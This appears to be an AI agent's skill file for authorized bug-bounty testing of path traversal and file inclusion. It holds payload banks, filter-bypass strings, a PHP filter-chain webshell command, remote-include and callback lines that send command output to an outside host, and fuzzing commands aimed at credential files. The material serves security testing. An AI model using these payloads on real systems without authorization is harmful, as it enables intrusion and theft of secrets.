---
name: bbhunt-path-traversal
description: "Use for file read/write primitives: download, export, template, include, and archive-extraction paths; PHP wrappers; symlinks; log poisoning. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Path Traversal / LFI / RFI — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus evidence (300 valid reports, 52 paid / 17%)

Payment is not validity — zero-bounty disclosures are mined as evidence too.

### Techniques ranked across ALL valid writeups

| Technique | Reports |
|---|---:|
| public source-code / repo review | 113 |
| internal service / port / container | 85 |
| file upload / filename / extension | 68 |
| admin / privileged-role context | 65 |
| HTTP method / verb tampering | 62 |
| WAF / sanitizer / filter bypass | 59 |
| unauthenticated / removed-cookie test | 43 |
| encoding / double-encode / null byte | 40 |
| Content-Type / body-format switch | 35 |
| header injection (Host / X-Forwarded / etc.) | 34 |

### Parameters observed

`type`, `max-age`, `path`, `url`, `name`, `textdomain`, `lang`, `filename`, `href`, `charset`, `file`, `token`, `result`, `vcs_metadata_dirs`, `version`

### Case studies (real reports, paid and unpaid)

- [1439593](https://hackerone.com/reports/1439593) GitLab — Arbitrary file read  via the bulk imports UploadsPipeline ($29000, critical)
- [827052](https://hackerone.com/reports/827052) GitLab — Arbitrary file read via the UploadsRewriter when moving and issue ($20000, critical)
- [1132378](https://hackerone.com/reports/1132378) GitLab — Arbitrary file read during project import ($16000, critical)

Full payload bank, bypass frequencies, approach patterns and case-study excerpts: `references/evidence.md`.

## Corpus-backed method (this class)

1. Identify the exact filesystem operation: read, include, write, or extract. The exploit differs for each.
2. Establish the base directory with a known file, then walk out with encoded and raw traversals at increasing depth.
3. Test encoding levels appropriate to the decoder chain: raw, URL, double URL, Unicode, and null termination where relevant.
4. For include primitives, identify wrappers supported by the stack (`php://`, `data://`, `zip://`, `phar://`) and confirm the interpreter.
5. For write/extract primitives, test absolute paths, symlinks inside archives, and filename control — arbitrary write is stronger than read.
6. Prove a specific file read with unique content; for RCE chains, use a controlled log/temp file rather than destructive changes.

### Signals

- Filename, path, file, document, template, or download parameters
- Archive upload/extract features
- Error messages exposing filesystem paths
- Language-specific include semantics (PHP wrappers, Java resources)

### Kill criteria

- Path is constrained to a fixed allowlist of real files.
- Traversal characters are stripped and no decoder mismatch exists.
- No identifiable file read — only generic errors.

### Escalation chains

- Symlink in archive -> arbitrary file read -> credentials.
- LFI + log poisoning -> RCE.
- Arbitrary write -> config override -> code execution.

### Veteran tip

Archive symlink handling is a repeated corpus theme — extraction code that changes permissions but keeps symlinks is a high-value pattern.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find file/path params: file, path, template, lang, download, export, log, image.
- Try `../`, encoded variants, double encoding, unicode, backslashes, absolute paths.
- Bypass filters with nested sequences (`....//`), null bytes, and extension tricks.
- Test archive extraction (zip slip) and file-write paths.
- Look for LFI-to-RCE via log poisoning, sessions, and uploads.

### Deeper checklist

- Find file/path parameters: file, path, template, lang, download, export, log.
- Try `../`, encoded variants, double encoding, unicode, backslashes, and absolute paths.
- Bypass filters with nested sequences (`....//`), null bytes, and extension tricks.
- Test archive extraction (zip slip) and file-write paths for traversal.
- Look for LFI-to-RCE via log poisoning, session files, and uploaded content.
- Read a harmless proof file (/etc/hostname, win.ini) and stop there.

### A. Discovery checklist — concrete places, params, headers, file types to look

- Parameter inventory beyond the classics: `?file= ?path= ?filename= ?template= ?view= ?lang= ?module= ?include= ?doc= ?load= ?read= ?content= ?download= ?img= ?pdf= ?report= ?style= ?dir=`, plus JSON bodies `{"filename":...}`, `{"path":...}`, `{"template":...}`.
- Non-query sinks that are easy to miss: multipart `filename` fields (PortSwigger labs for superfluous decode and null-byte bypass both use this), `Content-Disposition` filenames (curl CVE family), archive extraction entry names (Zip Slip), tar symlinks, and image-processing coder paths.
- Framework-specific 2025-2026 advisories to pattern-match: h3 `serveStatic()` GHSA-wr4h-v87w-p3r7 (percent-encoded `%2e%2e` dot segments), curl `file://` protocol handler traversals and FTP wildcard-download escapes, Weblate `.svn/.bzr` VCS metadata exclusion bypass CVE-2026-61792, WordPress `_wp_attachment_metadata` poisoning → arbitrary file deletion.
- Client-side path traversal (CSPT): encoded `../` in SPA router paths (React Router, Next.js, Vue Router, Angular, SvelteKit, Nuxt, Ember, SolidStart) bypasses route guards and controls the API URL — a CSRF/XSS primitive. Browser normalises literal `../` but not `%2E%2E`; backslashes normalise to slashes.
- Nginx alias misconfiguration: `location /images/ { alias /var/www/app/img/; }` without the trailing slash permits `/images../config.php`. Also check `location = /admin { deny all; }` bypass via trailing slash.
- Static-file/download endpoints, template/include params, export/report generators, an

### Signals and surfaces

### Signal

- Reports: **300** · paid: **52**
- Median bounty **$1,000** · p90 **$6,000** · max **$29,000** · total **$151,224**
- Median upvotes **12**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 5 | $79,000 | 2157 |
| Internet Bug Bounty | 11 | $18,355 | 368 |
| Basecamp | 3 | $9,337 | 158 |
| Mail.ru | 15 | $8,300 | 729 |
| PortSwigger Web Security | 3 | $6,000 | 322 |
| Mozilla | 2 | $6,000 | 233 |
| Keybase | 1 | $5,000 | 196 |
| Slack | 1 | $3,500 | 50 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`file` `path` `filename` `template` `lang` `download` `export` `log` `image` `folder` `dir`

### Crown Jewel Targets

LFI that reaches code execution is Critical. Pure file-read is High when it exposes secrets (`.env`, `wp-config.php`, private keys, cloud creds), Medium when it only reads non-sensitive files.

**Highest-value chains (in rough order of reliability in 2026):**
- **PHP filter-chain → RCE** — the modern default. A bare `php://filter` *file-read* primitive is upgraded to RCE with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. This is the single most impactful thing to try and the most-missed.
- **Log poisoning → RCE** — inject PHP into an Apache/Nginx log (User-Agent / URL path), then include the log. Increasingly blocked by `open_basedir` and unreadable log perms, so verify the log is *readable* first.
- **PHP wrappers → source disclosure** — `php://filter/convert.base64-encode/resource=index.php` leaks source; read source to find more LFI sinks, secrets, and the include base path.
- **RFI → RCE** — when `allow_url_include=On`, `?file=http://OOB/shell.txt` pulls and executes remote code. Rare on modern configs but trivially Critical when present.
- **phar:// deserialization** — a crafted PHAR + any unserialize-on-metadata sink → object-injection RCE.
- **zip:// / data:// chains** and **session/upload poisoning** when filters block wrappers.

---

### Technology Stack Signals

| Signal | Vector |
|--------|--------|
| PHP (`X-Powered-By`, `.php`, PHPSESSID) | php:// filter-chain RCE, phar://, zip://, data:// |
| Apache/Nginx logs readable | Log poisoning → RCE (verify readability first) |
| Apache 2.4.49 / 2.4.50 (`Server:` banner) | CVE-2021-41773 / CVE-2021-42013 traversal → RCE |
| PHP-CGI on Windows (XAMPP, `php-cgi.exe`) | CVE-2024-4577 arg-injection → RCE |
| Java servlet (`/WEB-INF/`) | `WEB-INF/web.xml`, `classes/`, `application.properties` |
| Python Flask/Django | `/proc/self/environ`, `settings.py`, `SECRET_KEY` |
| Node.js file-serve / `res.sendFile`, `express.static` | path-traversal read, `require()` traversal |
| Windows IIS / .NET | `..\..\web.config`, `C:\Windows\win.ini`, machineKey |

---

### Techniques, payloads and bypasses

### Payloads & probes

- `../../../../etc/passwd` `..%2f..%2f..%2fetc/passwd` `%2e%2e%2f%2e%2e%2f`
- `....//....//etc/passwd` `..\..\..\windows\win.ini` `..%c0%af..%c0%af`
- `/etc/passwd%00.png` `file:///etc/passwd` `php://filter/convert.base64-encode/resource=index`
- Zip slip -> `../../../../var/www/shell.php` in archive entry name

### Payload bank

**59 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Filter bypass

```text
....//....//....//etc/passwd
....\....\....\windows\win.ini
..././..././..././etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/..%00/etc/passwd
/etc/passwd%00.png
/etc/passwd%00.jpg
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc%252fpasswd
..//..//..//etc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
```

### Bypass tricks

- Double encoding and mixed encodings (%252e, %c0%af, overlong UTF-8).
- Strip traversal once, then bypass with `....//` or `..%2f`.
- Absolute paths, UNC paths, and symlinks.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Arbitrary file read via the UploadsRewriter when moving and issue** — `#827052` · GitLab · $20,000 · ▲1503
  > The `UploadsRewriter` does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project.
- **[CVE-2022-44268] Arbitrary Remote Leak via ImageMagick** — `#1858574` · HackerOne · $0 · ▲371
  > Then, copy the `Raw profile type:` and decode it using any tool or using Python like;
- **Arbitrary file read  via the bulk imports UploadsPipeline** — `#1439593` · GitLab · $29,000 · ▲329
  > Save the following simple proxy server as `api.py` and run it with `FLASK APP=api flask run`, this will replace the `uploads.tar.gz` with a custom one: {F1565789}
- **Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data** — `#876295` · Starbucks · $0 · ▲239
  > zlz and rhynorater discovered that by obtaining a valid authentication cookie and then combining that with a path traversal, this allowed access to restricted data.
- **Arbitrary file read during project import** — `#1132378` · GitLab · $16,000 · ▲194
  > I went through the charts in `https://gitlab.com/gitlab-org/charts/gitlab/-/tree/master/charts/gitlab/charts/sidekiq/templates`.
- **Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling** — `#3712279` · PortSwigger Web Security · $5,000 · 

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 26× | `../` |
| 8× | `path.resolve()` |
| 6× | `path.join()` |
| 6× | `$backup_sizes` |
| 6× | `finalize_item()` |
| 6× | `/../` |
| 6× | `%2f%2e%2e%2f` |
| 5× | `wp_delete_attachment_files()` |
| 5× | `$meta['file']` |
| 5× | `dedotdotify()` |
| 5× | `$id` |
| 4× | `Buffer.from()` |
| 4× | `Curl_urldecode()` |
| 4× | `ctxt->root` |
| 4× | `openat()` |
| 4× | `%2f` |
| 4× | `to a chosen directory (in this case,` |
| 4× | `<server-IP>` |
| 3× | `$to` |
| 3× | `.attach()` |

_...and 3 more sections in `references/unified-method.md`._

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-LFI — Local / Remote File Inclusion & Path Traversal

### OOB / Blind-LFI Confirmation Gate (Read First)

LFI is frequently **blind**: the included content is parsed/executed but never reflected, or the page swallows the file into a template you can't see. Do **not** claim LFI from indirect signals alone.

### What is NOT confirmation

- A different status code or error string for `../../etc/passwd` vs a normal value. The app may be string-matching `../` and returning a canned 403/500 without ever touching the filesystem.
- Your input **echoed back** inside an error message (e.g. `failed to open '/var/www/../../etc/passwd'`). That is the path *formatter*, not proof the file was read. A genuine read shows file **contents**, not your path.
- A page that "looks different." Reflected-input or WAF block pages produce diffs unrelated to a real read.

### What IS confirmation

- **Direct read:** actual file *contents* appear (real `root:x:0:0:` line, real PHP source after base64-decoding the filter output).
- **Blind read via OOB exfil:** use a php://filter or XXE-style chain whose payload performs a DNS/HTTP callback to your **Burp Collaborator** subdomain, or use an `expect://` / wrapper that triggers an outbound request. A unique-per-sink Collaborator hit (DNS + HTTP, with the server's source IP) proves the include ran.
- **Blind read via differential/timing:** include a file you *know* exists and is large (`/etc/passwd`) vs one that does not (`/etc/passwd_nope_<rand>`). Stable, repeatable response-length or latency delta = real filesystem access. Confirm with a third known-good path to rule out coincidence.

### Validation Discipline

**Direct-read proof (not a false positive):**
- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
- For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.
- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) — only the real file returns content.

**Blind / OOB proof:**
- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.
- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise — retract.

**Partial / truncated reads:**
- Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.

**RCE proof:** show command output you control — `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). "The payload was accepted" is not RCE.

**Severity:**
- Non-sensitive file read: **Medium**
- File read exposing DB creds / API keys / private keys / cloud creds: **High**
- RCE via filter-chain / RFI / log / sess

_...and 2 more sections in `references/unified-method.md`._

### Escalation and related chains

### Escalation chains

- LFI -> log poisoning -> RCE.
- Arbitrary file read -> secrets -> ATO.
- Zip slip -> webshell.

### Phase 4 — PHP Filter-Chain → RCE (no upload, no writable file)

The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**

```bash
# Generate the chain (public tool, no CVE — it abuses documented iconv behaviour):
#   git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Tool prints a long php://filter|convert.iconv.*|...|resource=php://temp string.
# Drop it into the sink:
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<long-chain>...|convert.base64-decode/resource=php://temp&c=id
```
Notes / gotchas:
- Requires the include sink to accept the `php://filter` scheme (most LFI sinks calling `include`/`require`/`file_get_contents` on the param do).
- Payloads get **long** (10–50KB). If the param is length-capped or WAF-blocked on size, move it to a POST body, or use a minimal payload (`<?=`shorthand`?>`).
- For blind targets, set the chain payload to a Collaborator callback (`<?php file_get_contents("http://x.<collab>/".`id`);?>`) to confirm execution OOB.
- This works even when log poisoning fails (unreadable logs, `open_basedir`). Try it whenever you have a php:// filter read.

### Chain Table

| LFI primitive | Chain to | Impact |
|---------------|----------|--------|
| `php://filter` read | **filter-chain RCE (Phase 4)** | RCE with no upload — **Critical** |
| File read | `.env` / `config.php` / `wp-config.php` | DB creds, API keys → backend takeover |
| File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |
| Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
| File read + upload | phar:// / log / session poison | RCE — **Critical** |
| Source disclosure | full app source | hardcoded secrets, new sinks, machineKey |

---

### Tools and wordlists

### Tools

`ffuf` · `Burp` · `dotdotpwn` · `nuclei`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_path-traversal.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_path-traversal.txt` | 79 |
| `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal.txt` | 59 |
| `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal_waf.txt` | 12 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_path-traversal.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_path-traversal.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_path-traversal.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Point the LFI fuzzers at file/download/export parameters.

```sh
nuclei -u https://target -tags lfi,traversal,path-traversal \
       -severity low,medium,high,critical -rl 40 -o nuclei_path-traversal.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/lfi -dast \
       -rl 40 -o nuclei_path-traversal_lfi.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/linux-lfi-fuzzing.yaml \
       -rl 40 -o nuclei_path-traversal_linux-lfi-fuzzing.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/windows-lfi-fuzzing.yaml \
       -rl 40 -o nuclei_path-traversal_windows-lfi-fuzzing.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-path-traversal`
- `hunting` — `path-traversal`
- `cbh` — `hunt-lfi`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `references/unified-method.md` — includes 2 merged companion methodology documents
- `references/corpus-wordlists/` — 4 mined paths/params/payload lists from the HackerOne corpus
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
